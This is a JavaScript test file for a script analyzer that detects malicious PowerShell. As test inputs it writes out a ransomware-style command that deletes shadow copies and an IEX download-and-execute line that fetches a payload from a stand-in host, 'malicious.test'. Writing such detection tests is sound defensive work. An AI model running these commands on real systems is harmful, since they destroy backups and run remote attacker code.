import { test } from 'node:test';
import assert from 'node:assert/strict';
import { analyzeScript } from '../server/services/scriptAnalyzer.js';

test('Script Analyzer: Detects ransomware shadow copy deletion command', () => {
  const scriptContent = 'Write-Host "Starting"; vssadmin delete shadows /all /quiet; Write-Host "Done";';
  const result = analyzeScript(Buffer.from(scriptContent, 'utf8'), 'script');

  assert.equal(result.isScript, true);
  assert.equal(result.hasSevereIndicators, true);
  const vssFinding = result.findings.find((f) => f.ruleId === 'RANSOMWARE_VSSADMIN');
  assert.ok(vssFinding, 'Expected RANSOMWARE_VSSADMIN rule to trigger');
  assert.equal(vssFinding.severity, 'CRITICAL');
});

test('Script Analyzer: Detects in-memory IEX download routine', () => {
  const scriptContent = 'IEX (New-Object Net.WebClient).DownloadString("http://malicious.test/payload.ps1")';
  const result = analyzeScript(Buffer.from(scriptContent, 'utf8'), 'script');

  assert.equal(result.isScript, true);
  const iexFinding = result.findings.find((f) => f.ruleId === 'POWERSHELL_IEX_DOWNLOAD');
  assert.ok(iexFinding, 'Expected POWERSHELL_IEX_DOWNLOAD rule to trigger');
  assert.equal(iexFinding.severity, 'HIGH');
});

test('Script Analyzer: Normal benign script triggers no critical rules', () => {
  const scriptContent = 'Get-ChildItem -Path C:\\Users -Recurse | Select-Object Name, Length';
  const result = analyzeScript(Buffer.from(scriptContent, 'utf8'), 'script');

  assert.equal(result.hasSevereIndicators, false);
  assert.equal(result.findings.length, 0);
});
